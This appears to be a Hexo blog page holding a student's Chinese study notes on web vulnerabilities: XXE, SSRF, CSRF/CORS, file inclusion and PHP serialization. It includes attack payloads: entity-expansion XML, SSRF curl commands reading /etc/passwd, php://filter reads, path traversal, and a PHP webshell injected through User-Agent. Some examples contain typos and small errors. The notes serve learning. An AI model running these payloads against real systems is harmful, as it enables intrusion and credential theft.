@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-top10/7序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/08/top10/7%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
+  <time class="dt-published" datetime="2024-10-08T02:40:41.315Z" itemprop="datePublished">2024-10-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><h3 id="a-unserialize-serialize-‘system-‘ls’-’-这样的话ls会执行吗"><a href="#a-unserialize-serialize-‘system-‘ls’-’-这样的话ls会执行吗" class="headerlink" title="$a&#x3D;unserialize(serialize(‘system(‘ls’)’)),这样的话ls会执行吗"></a>$a&#x3D;unserialize(serialize(‘system(‘ls’)’)),这样的话ls会执行吗</h3><pre><code>●	serialize函数只是对字符串值&#39;system(\&#39;ls\&#39;)&#39;进行序列化，它并不知道这个字符串里面包含的是可执行的命令相关内容。unserialize也仅仅是将序列化后的字符串再还原回原来的字符串。
+
+●	在 PHP 中，一个字符串并不会自动被识别并执行其中可能包含的命令。要执行系统命令，必须明确地调用执行系统命令的函数（如system、exec、shell_exec等）。
+
+2.	执行机制的不同
+
+●	当你直接写$a = system(&#39;ls&#39;);时，PHP 会识别system是一个执行系统命令的函数，并尝试执行括号内的ls命令。
+
+●	而在$a = unserialize(serialize(&#39;system(\&#39;ls\&#39;)&#39;));中，整个过程只是对字符串的序列化和反序列化操作，不会触发系统命令的执行机制。
+</code></pre>
+<p>所以，在执行完$a &#x3D; unserialize(serialize(‘system(&#39;ls&#39;)’));后，$a的值为system(‘ls’)（这是一个字符串），而不是执行system(‘ls’)这个命令后的结果。</p>
+<h3 id="unserialize之后的内容全是字符串吗"><a href="#unserialize之后的内容全是字符串吗" class="headerlink" title="unserialize之后的内容全是字符串吗"></a>unserialize之后的内容全是字符串吗</h3><p>数组，对象，字符串各回各家</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/08/top10/7%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cm1zupb1n000gqcasddbr616o" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-top10/5xxe" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/08/top10/5xxe/" class="article-date">
+  <time class="dt-published" datetime="2024-10-08T02:40:41.314Z" itemprop="datePublished">2024-10-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="xxe-xml外部实体注入攻击漏洞"><a href="#xxe-xml外部实体注入攻击漏洞" class="headerlink" title="xxe-xml外部实体注入攻击漏洞"></a>xxe-xml外部实体注入攻击漏洞</h1><h2 id="xml基础"><a href="#xml基础" class="headerlink" title="xml基础"></a>xml基础</h2><p>标记电子文件，使其有结构性，的可扩展标记语言</p>
+<p>类似于html，但没有固定的标签（<script>），所有的标签都可以自定义</p>
+<p>设计宗旨是传输数，而不是像html一样显示数据</p>
+<p>xml会解析文档中所有文本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;//声明是xml文档</span><br><span class="line">&lt;!DOCTYPE book [//DTD文档类型定义，可以没有document type definition</span><br><span class="line">		&lt;!ELEMENT book (name,author,year)&gt;</span><br><span class="line">		&lt;!ELEMENT mname (#PCDATA)&gt;</span><br><span class="line">		&lt;!ELEMENT author (#PCDATA)&gt; </span><br><span class="line">		&lt;!ELEMENT year (#pcdata)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">DTD在xml源文件外部</span><br><span class="line">&lt;!DOCTYPE book SYSTEM &quot;url地址或者文件名&quot;&gt;文件名内就是上面那个定义一样的类型</span><br><span class="line">&lt;book id=&quot;1&quot;&gt;//自定义根元素book 属性id为1</span><br><span class="line">		&lt;name&gt;XML&lt;?name&gt;//自定义了四个元素，即book对象的属性，属性值必须加引号</span><br><span class="line">		&lt;author&gt;xml&lt;/author&gt;</span><br><span class="line">		&lt;year&gt;2020&lt;/year&gt;</span><br><span class="line">		&lt;price&gt;100.00&lt;/price&gt;</span><br><span class="line">&lt;/book&gt;//根元素的闭合</span><br><span class="line">类似于类，一本书，这本书编号为1，书名，作者，出版年份，页数</span><br></pre></td></tr></table></figure>
+
+<h1 id="pcdata"><a href="#pcdata" class="headerlink" title="pcdata"></a>pcdata</h1><p>parsed character data被解析的字符数据</p>
+<p>包含字符，文本数据，将被解析器检查实体，标记，</p>
+<p>&lt    <只能用实体表示</p>
+<p>&gt   ></p>
+<p>&amp  &</p>
+<p>&apos  .</p>
+<p>&quot   ‘’</p>
+<h1 id="cdata"><a href="#cdata" class="headerlink" title="cdata"></a>cdata</h1><p>不应有xml解析器解析，内容欸解析器忽略</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;![CDATA[内容]]&gt;</span><br><span class="line">内容中不允许包含]]&gt;作为字符串</span><br><span class="line">内容不允许嵌套CDATABUFRN ,会导致异常闭合</span><br><span class="line">标记结尾的]]&gt;不允许有空格和空行</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xmlversion=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE book SYSTEM &quot;cata.did&quot;&gt;</span><br><span class="line">&lt;book&gt;</span><br><span class="line">		&lt;name&gt;&lt;![CDATA[</span><br><span class="line">				&lt;?php</span><br><span class="line">					echo&quot;123&quot;;</span><br><span class="line">					</span><br><span class="line">		]]&gt;</span><br><span class="line">		&lt;/name&gt;里面的PHP代码也不会被执行</span><br></pre></td></tr></table></figure>
+
+<h1 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h1><h2 id="内部普通实体-ddos"><a href="#内部普通实体-ddos" class="headerlink" title="内部普通实体-ddos"></a>内部普通实体-ddos</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE book[</span><br><span class="line">	&lt;!ELEMENT book ANY&gt;</span><br><span class="line">	&lt;!ENTITY bar &quot;world&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;book&gt;</span><br><span class="line">	hello &amp;bar;</span><br><span class="line">&lt;/book&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE book[</span><br><span class="line">	&lt;!ELEMENT book ANY&gt;</span><br><span class="line">	&lt;!ENTITY a1 &quot;world&quot;&gt;</span><br><span class="line">	&lt;!ENTITY a2 &quot;$a1;$a1&quot;&gt;</span><br><span class="line">	&lt;!ENTITY a3 &quot;$a2;$a2;$a2&quot;&gt;</span><br><span class="line">	&lt;!ENTITY a4 &quot;a3;$a3;$a3&quot;&gt;</span><br><span class="line">	</span><br><span class="line">]&gt;</span><br><span class="line">&lt;book&gt;</span><br><span class="line">	hello &amp;a4;</span><br><span class="line">&lt;/book&gt;</span><br><span class="line">特别耗能，ddos攻击</span><br></pre></td></tr></table></figure>
+
+<h2 id="外部普通实体"><a href="#外部普通实体" class="headerlink" title="外部普通实体"></a>外部普通实体</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY实体名称SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">&lt;!ENTITY实体名称PUBLIC &quot;DTD标识名&quot; “公用DTD的URL”&gt;</span><br></pre></td></tr></table></figure>
+
+<p>PUBLIC是值佛能公共用DTD，是某个权威机构制</p>
+<p>SYSTEM指的是，这个外部DTD文件时私有的，自己创建的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=covert.base64-encode/resource-d:/123.txt&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="xxe定义"><a href="#xxe定义" class="headerlink" title="xxe定义"></a>xxe定义</h1><p>xml external entity，xml外部实体攻击，</p>
+<p>发生在应用程序解析xml输入时，没有禁止外部实体加载</p>
+<p>通过恶意外部实体得到数据</p>
+<p>xml解析时支持多种协议，file来读取本地文件，http获取web资源</p>
+<h1 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h1><h2 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h2><p>即payload执行结果直接显示在页面</p>
+<h2 id="无回显blind-xxe"><a href="#无回显blind-xxe" class="headerlink" title="无回显blind xxe"></a>无回显blind xxe</h2><p>外带数据通道提取数据，即带外xml外部实体oob-xxe</p>
+<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><ul>
+<li>先找能接受xml作为输入内容的端点</li>
+</ul>
+<p>​		可以通过修改http请求方法，修改content-type头部字段等方法，看应用程序的响应，看是否解析了，如果解析了就可能存在xxe<br>​		攻击漏洞</p>
+<ul>
+<li>如果解析xml，就可以尝试引用实体和DTD</li>
+<li>如果可以引用外部实体就，存在xxe漏洞</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/08/top10/5xxe/" data-id="cm1zupb1n000eqcas6ze45xje" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-top10/4ssrf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/08/top10/4ssrf/" class="article-date">
+  <time class="dt-published" datetime="2024-10-08T02:40:41.313Z" itemprop="datePublished">2024-10-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><p>server-side request forgery,服务端请求伪造</p>
+<p>有防火墙，攻击者无法入侵内网，以服务器为跳板发起请求，得到数据</p>
+<h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><p>服务端提供了从其他服务器获取数据的功能，没对目标地址严格过滤</p>
+<p>攻击者传入任意地址让服务端对其进行请求，并返回对目标地址的请求数据</p>
+<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><p>收集内网信息，管理员密码等</p>
+<p>得到webshell</p>
+<p>获得内部资源</p>
+<h1 id="存在场景"><a href="#存在场景" class="headerlink" title="存在场景"></a>存在场景</h1><ul>
+<li>分享网站，分享后的请求头里有分享内容中的链接，把链接换成内网地址，或者外网的地址</li>
+<li>百度翻译输入网址会解析出来，搞成一个百度的内网ip</li>
+</ul>
+<h1 id="链接一般跟在"><a href="#链接一般跟在" class="headerlink" title="链接一般跟在"></a>链接一般跟在</h1><p>share wap url link src source target u 3g display sourceURL imageURL domain</p>
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h1 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h1><p>字典服务器协议，客户端访问过程中访问更多字典源<br>在ssrf中如果可以利用协议，可以轻易获得目标服务器端口上运行的版本等信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本地利用：curl -v &#x27;dict://127.0.1.1:22&#x27;-v是展示访问呢过程，包括请求头，端口链接，本地是我的电脑</span><br><span class="line">远程利用：#curl -v &#x27;http://47.105.75.177:8080/vulnad/curl.php?url=dict://139.9.198.30:22&#x27;是访问47.105的这个服务器的内网</span><br></pre></td></tr></table></figure>
+
+<h1 id="filE协议"><a href="#filE协议" class="headerlink" title="filE协议"></a>filE协议</h1><p>文件系统中获取文件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本地：curl -v &#x27;file:///etc/password&#x27;</span><br><span class="line">远程：curl -v &#x27;htttp;//47.105.75.177.8080/vulnable/curl.php?url=file:///etc/passwd&#x27;windows就用C:\windows\win.ini</span><br></pre></td></tr></table></figure>
+
+<h1 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h1><p>goper:&#x2F;&#x2F;10.1.2.3:23&#x2F;nihao(url encode)</p>
+<h1 id="ssrf-in-php"><a href="#ssrf-in-php" class="headerlink" title="ssrf in php"></a>ssrf in php</h1><ul>
+<li><h5 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec"></a>curl_exec</h5><p>   会请求后边的url，用file dict</p>
+</li>
+<li><h5 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h5></li>
+</ul>
+<p>​	   经常跟filter：&#x2F;&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;123.php<br>​		也可以只跟文件，但php只能跟filter</p>
+<ul>
+<li><h5 id="fsocopen"><a href="#fsocopen" class="headerlink" title="fsocopen()"></a>fsocopen()</h5>对指定ip访问，返回内容，只能对域名和IP进行访问，http这种的网址不行</li>
+</ul>
+<h1 id="无回显，盲ssrf"><a href="#无回显，盲ssrf" class="headerlink" title="无回显，盲ssrf"></a>无回显，盲ssrf</h1><h4 id="http带外通道"><a href="#http带外通道" class="headerlink" title="http带外通道"></a>http带外通道</h4><p>bp collaborator client</p>
+<h4 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h4><h4 id="这俩只能用来看他是否访问，但仍没有回显"><a href="#这俩只能用来看他是否访问，但仍没有回显" class="headerlink" title="这俩只能用来看他是否访问，但仍没有回显"></a>这俩只能用来看他是否访问，但仍没有回显</h4><h1 id="ssrf利用限制绕过"><a href="#ssrf利用限制绕过" class="headerlink" title="ssrf利用限制绕过"></a>ssrf利用限制绕过</h1><ul>
+<li><h3 id="利用解析url"><a href="#利用解析url" class="headerlink" title="利用解析url"></a>利用解析url</h3><p>有时，后端会对访问的url进行解析，对解析出来的host地址进行过滤<br>可能会解析url不当，绕过过滤</p>
+<p>比如<a target="_blank" rel="noopener" href="http://www.baidu.com@10.10.10.10,会解析出来跟直接访问10.10.10.10一样/">www.baidu.com@10.10.10.10,会解析出来跟直接访问10.10.10.10一样</a></p>
+<ul>
+<li><h4 id="ip地址转化成进制"><a href="#ip地址转化成进制" class="headerlink" title="ip地址转化成进制"></a>ip地址转化成进制</h4></li>
+<li><h5 id="添加端口可能会跳过正则匹配"><a href="#添加端口可能会跳过正则匹配" class="headerlink" title="添加端口可能会跳过正则匹配"></a>添加端口可能会跳过正则匹配</h5></li>
+<li><h4 id="xip-io-xip-name"><a href="#xip-io-xip-name" class="headerlink" title="xip.io  xip.name"></a>xip.io  xip.name</h4><p><a target="_blank" rel="noopener" href="http://11.22.22.33.xip.io/">http://11.22.22.33.xip.io</a><br>会重定向到前面的IP</p>
+</li>
+<li><p>短地址绕过</p>
+<p>内网ip有时候会被正则表达式过滤掉，在线网站转化即可</p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>过滤返回的，敏感信息</p>
+<p>设置请求端口</p>
+<p>禁用不需要的协议</p>
+<p>内网黑名单</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/08/top10/4ssrf/" data-id="cm1zupb1m000dqcashau395io" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-top10/3csrf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/08/top10/3csrf/" class="article-date">
+  <time class="dt-published" datetime="2024-10-08T02:40:41.312Z" itemprop="datePublished">2024-10-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h1><p>挟持用户在当前已登陆的web进程中执行非本意的操作</p>
+<h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><p>cookie在浏览器中不会过期，只要不退出不关浏览器，	攻击者发送csrf脚本或者含这个脚本的链接，就执行了一些非本意的功能</p>
+<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><h5 id="正常：增删改等操作，基于操作的csrf"><a href="#正常：增删改等操作，基于操作的csrf" class="headerlink" title="正常：增删改等操作，基于操作的csrf"></a>正常：增删改等操作，基于操作的csrf</h5><h4 id="另类：json，cors，flash跨域劫持-基于文件读取的csrf"><a href="#另类：json，cors，flash跨域劫持-基于文件读取的csrf" class="headerlink" title="另类：json，cors，flash跨域劫持,基于文件读取的csrf"></a>另类：json，cors，flash跨域劫持,基于文件读取的csrf</h4><h1 id="基于操作的"><a href="#基于操作的" class="headerlink" title="基于操作的"></a>基于操作的</h1><ul>
+<li>repeater—engagement tools自动生成csrf脚本</li>
+<li>检查refer，auth，tooken，只要这三个可以删除就行，因为这三个获取不到</li>
+<li>发链接给受害者，只要他打开，就相当于他做了这个请求，就执行了他不想操作的命令（基于操作），</li>
+</ul>
+<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>不同源的客户脚本在没有授权的情况下不能读取其他客户的文件</p>
+<p>但是从一个域名的网页请求另一个域名资源时就会受限制</p>
+<p>故跨域解决方案：json，cors，postmessage</p>
+<h1 id="cors"><a href="#cors" class="headerlink" title="cors"></a>cors</h1><p>cross—source resource sharing，跨源资源共享</p>
+<p>是一种ajax跨域请求资源的方式</p>
+<p>发送请求，浏览器发现请求不符合同源策略，会给他加一个请求头，Origin</p>
+<p>后台进行处理，如果接受请求，返回结果中加响应头Access-Control-Allow-Origin&#x2F;&#x2F;有些是没有设计这个响应头的，即你想访问的网站不允许你cors</p>
+<p>浏览器会判断该响应头中是否包含origin的值，含，处理响应，拿到数据，不含，驳回相应</p>
+<h4 id="cors简单验证"><a href="#cors简单验证" class="headerlink" title="cors简单验证"></a>cors简单验证</h4><p>修改origin的值响应头里access-allow-origin会跟着改变</p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>配置了cors的前提下，登录着a网站，打算跨域访问b网站，浏览器识别到此操作为跨域，会在数据包里面加入origin，实现跨域</p>
+<p>当cors配置错误就可以利用了	                                                                               </p>
+<p>找个脚本，搞上自己的DNSlog</p>
+<h1 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h1><script src=url>内部是js代码
+    从其他域获取数据，这个数据是json格式，故url后边加上一个？callback=showData回调函数
+
+## 判断是否存在
+
+改bp中callback的值，返回数据的最前面会发生相应的变化
+
+也是用个脚本
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/08/top10/3csrf/" data-id="cm1zupb1m000cqcas3v5d30gp" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-top10/1漏洞挖掘" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/08/top10/1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" class="article-date">
+  <time class="dt-published" datetime="2024-10-08T02:40:41.311Z" itemprop="datePublished">2024-10-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><h2 id="漏洞定义"><a href="#漏洞定义" class="headerlink" title="漏洞定义"></a>漏洞定义</h2><p>硬件、软件、协议的具体实现、系统安全策略，缺陷</p>
+<h2 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h2><p>王思聪生日</p>
+<p>淘宝理赔，超时发货，水果理赔</p>
+<p>签约，首冲同时操作</p>
+<p>接受协议，抓包取消勾选</p>
+<p>直播炸房</p>
+<p>网约车恶意约车</p>
+<p>美团该地址</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/08/top10/1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" data-id="cm1zupb1l000aqcas3ln0dbg2" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-top10/2文件包含" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/08/top10/2%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
+  <time class="dt-published" datetime="2024-10-08T02:40:41.311Z" itemprop="datePublished">2024-10-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="文件包含-文件上传完会进行解析"><a href="#文件包含-文件上传完会进行解析" class="headerlink" title="文件包含(文件上传完会进行解析)"></a>文件包含(文件上传完会进行解析)</h1><p>即脚本中含另外一个文件，即文件引用，可以保证统一风格，导航栏、底部footer栏</p>
+<h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>参数没有严格过滤，被用户控制包含恶意文件</p>
+<h2 id="php中文件包含函数"><a href="#php中文件包含函数" class="headerlink" title="php中文件包含函数"></a>php中文件包含函数</h2><h3 id="require"><a href="#require" class="headerlink" title="require"></a>require</h3><p>require：函数出错，报错，退出</p>
+<p>require_once:出错，直接退出，仅包含一次，脚本执行时，同一个文件文件可能被多次引用，出现函数重定义，变量重新赋值</p>
+<h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><p><code>nclude()</code> 函数用于包含并运行一个指定的文件</p>
+<p>在包含文件时，如果文件中存在 PHP 代码，那么这些代码将被执行。如果只是包含静态内容（如 HTML 或纯文本），则内容将被直接输出到浏览器。</p>
+<p>include：错误，警报，继续执行</p>
+<p>include_once:出错，警告，仅含一次</p>
+<p><code>include_once()</code> 与 <code>include()</code> 类似，但它会先检查文件是否已经被包含过，如果已经被包含，则不会再次包含。</p>
+<h2 id="类型和利用"><a href="#类型和利用" class="headerlink" title="类型和利用"></a>类型和利用</h2><h3 id="本地文件包含local-file-include"><a href="#本地文件包含local-file-include" class="headerlink" title="本地文件包含local file include"></a>本地文件包含local file include</h3><p>(是服务器的本地文件)</p>
+<p>被包含文件在服务器本地</p>
+<p>利用，本地敏感文件，上传文件</p>
+<h4 id="包含系统文件"><a href="#包含系统文件" class="headerlink" title="包含系统文件"></a>包含系统文件</h4><p>&#x2F;？参数&#x3D;C：&#x2F;wodows&#x2F;123.php</p>
+<p>&#x3D;&#x3D;这俩能互换嘛，区别来&#x3D;&#x3D;</p>
+<h4 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h4><p>&#x2F;？参数&#x3D;..&#x2F;..&#x2F;..&#x2F;flag</p>
+<h4 id="敏感文件默认路径"><a href="#敏感文件默认路径" class="headerlink" title="敏感文件默认路径"></a>敏感文件默认路径</h4><h6 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h6><p>C:\boot.ini    &#x2F;&#x2F;查看系统版本</p>
+<p>C:\windows\system32\inetsrv\metabase.xml &#x2F;&#x2F;iis的配置文件</p>
+<h6 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h6><p>&#x2F;etc&#x2F;passwd  &#x2F;&#x2F;账户信息</p>
+<p>&#x2F;etc&#x2F;shadow  &#x2F;&#x2F;账户密码文件</p>
+<h3 id="远程文件包含remote-file-inclusion"><a href="#远程文件包含remote-file-inclusion" class="headerlink" title="远程文件包含remote file inclusion"></a>远程文件包含remote file inclusion</h3><p>&#x3D;&#x3D;将我的电脑上的文件上传到话是http我的ip？局域网？&#x3D;&#x3D;</p>
+<p>被包含文件在远程服务端</p>
+<p>利用，指定远程url文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen = On</span><br><span class="line">allow_url_include = On</span><br></pre></td></tr></table></figure>
+
+<p>&#x3D;&#x3D;举实例是上传.txt内容是php（会以php的语法执行txt？为什么不直接上传php，就算防后缀，把木马php改成txt？），fopen一个php文件，写入木马，访问这个php文件（php访问的时候是执行而不显示内容？那想要看到内容怎么办？），然后蚁剑，蚁剑链接到这个php文件&#x3D;&#x3D;</p>
+<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>获取敏感信息<br>执行任意命令<br>获取服务器信息</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ul>
+<li><h4 id="配合日志"><a href="#配合日志" class="headerlink" title="配合日志"></a>配合日志</h4>上传name，回车，会有参数名在url上，改url但url编码会让php语句不被识别，用burp，凡是php语句都会被执行（好像是）</li>
+</ul>
+<p>​		..&#x2F;..&#x2F;..&#x2F;Apache&#x2F;logs&#x2F;access.log获得日志</p>
+<ul>
+<li><h4 id="配合-proc-self-environ文件"><a href="#配合-proc-self-environ文件" class="headerlink" title="配合&#x2F;proc&#x2F;self&#x2F;environ文件"></a>配合&#x2F;proc&#x2F;self&#x2F;environ文件</h4><p>在burp中将cmd的命令&lt;?php system($_GET[‘cmd’]);?.添加到useragent，&#x2F;?参数&#x3D;&#x2F;proc&#x2F;self&#x2F;enviro&amp;cmd&#x3D;id</p>
+</li>
